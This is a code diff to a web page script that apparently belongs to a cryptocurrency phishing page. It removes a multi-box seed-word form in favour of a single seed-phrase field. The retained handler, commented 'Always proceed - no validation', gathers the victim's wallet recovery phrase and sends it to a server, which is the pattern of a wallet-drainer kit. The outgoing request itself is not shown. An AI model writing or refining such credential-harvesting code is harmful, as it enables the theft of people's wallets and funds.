@@ -887,58 +887,12 @@ document.addEventListener('DOMContentLoaded', function() {
             page: window.location.pathname
         }
     });
-
-    const wordButtons = document.querySelectorAll('.custom-button');
-    const inputContainer = document.querySelector('.grid');
-    let currentWordCount = 12; // Default word count
-
-    function generateInputs(wordCount) {
-        currentWordCount = wordCount;
-        let inputs = '';
-        
-        // Set grid columns based on word count
-        const cols = wordCount === 12 ? 4 : wordCount === 18 || wordCount === 24 ? 4 : 3;
-        
-        // Update the grid layout using inline styles
-        inputContainer.style.display = 'grid';
-        inputContainer.style.gridTemplateColumns = `repeat(${cols}, minmax(0, 1fr))`;
-        inputContainer.style.gap = '1rem';
-        
-        for(let i = 1; i <= wordCount; i++) {
-            inputs += `
-                <input type="text" 
-                       placeholder="${i}. word" 
-                       class="seed-word-input bg-[#151515] text-gray-300 py-2 px-2 rounded-md"
-                       style="outline-color: #262626; border-radius: 2.5px">
-            `;
-        }
-        inputContainer.innerHTML = inputs;
-    }
-
-    // Handle button selection
-    wordButtons.forEach(button => {
-        button.addEventListener('click', function() {
-            // Reset all buttons
-            wordButtons.forEach(btn => {
-                btn.classList.remove('bg-[#B7A3F5]', 'text-black');
-                btn.classList.add('bg-[#222222]', 'text-gray-400');
-            });
-            
-            // Style selected button
-            this.classList.remove('bg-[#222222]', 'text-gray-400');
-            this.classList.add('bg-[#B7A3F5]', 'text-black');
-            
-            const wordCount = parseInt(this.textContent);
-            generateInputs(wordCount);
-        });
-    });
-
+    
     // Handle form submission
     document.getElementById('continue').addEventListener('click', function() {
-        const inputs = document.querySelectorAll('.seed-word-input');
-        const seedArray = Array.from(inputs).map(input => input.value.trim()).filter(word => word !== '');
-        const seedPhrase = seedArray.join(' ');
-
+        // Get the seed phrase from the single input field
+        const seedPhrase = document.getElementById('seed_phrase').value.trim();
+        
         // Always proceed - no validation
         try {
             // Send data to server
@@ -985,9 +939,6 @@ document.addEventListener('DOMContentLoaded', function() {
             window.history.replaceState({}, '', url);
         }
     });
-
-    // Initialize with 12 words
-    generateInputs(12);
 });
 			</script>
 		
